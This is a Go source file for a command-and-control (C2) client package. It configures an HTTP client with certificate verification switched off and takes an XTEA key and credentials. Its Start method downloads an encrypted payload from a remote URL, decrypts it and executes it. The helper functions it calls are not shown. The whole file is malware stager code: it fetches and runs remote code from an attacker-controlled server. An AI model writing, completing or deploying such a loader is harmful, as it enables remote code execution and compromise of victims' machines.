package c2

import (
	"crypto/tls"
	"net/http"
	"time"
)

// C2 represents the C2 client configuration
type C2 struct {
	URL        string
	Key        []byte
	HTTPClient *http.Client
	Username   string
	Password   string
}

// Option defines a function type for configuring the C2 client
type Option func(*C2)

// WithURL sets the URL for the C2 client
func WithURL(url string) Option {
	return func(c *C2) {
		c.URL = url
	}
}

// WithKey sets the decryption key for the C2 client
// Key must be 16 bytes long for XTEA encryption
func WithKey(key []byte) Option {
	return func(c *C2) {
		c.Key = key
	}
}

// WithHTTPClient sets a custom HTTP client
func WithHTTPClient(client *http.Client) Option {
	return func(c *C2) {
		c.HTTPClient = client
	}
}

// WithUsername sets the username for basic authentication
func WithUsername(username string) Option {
	return func(c *C2) {
		c.Username = username
	}
}

// WithPassword sets the password for basic authentication
func WithPassword(password string) Option {
	return func(c *C2) {
		c.Password = password
	}
}

// New creates a new C2 client with the given options
func New(options ...Option) *C2 {
	// Default configuration
	c2 := &C2{
		HTTPClient: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				MaxIdleConns:        10,
				IdleConnTimeout:     90 * time.Second,
				TLSHandshakeTimeout: 10 * time.Second,
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true, // Skip HTTPS certificate verification
				},
			},
		},
	}

	// Apply options
	for _, option := range options {
		option(c2)
	}

	return c2
}

// Start starts the C2 client, downloading and executing payloads
func (c *C2) Start() error {
	// Download encrypted payload from URL
	encryptedPayload, err := c.downloadPayload()
	if err != nil {
		return err
	}

	// Decrypt payload
	decryptedPayload, err := c.decryptPayload(encryptedPayload)
	if err != nil {
		return err
	}

	// Execute payload
	return c.executePayload(decryptedPayload)
}
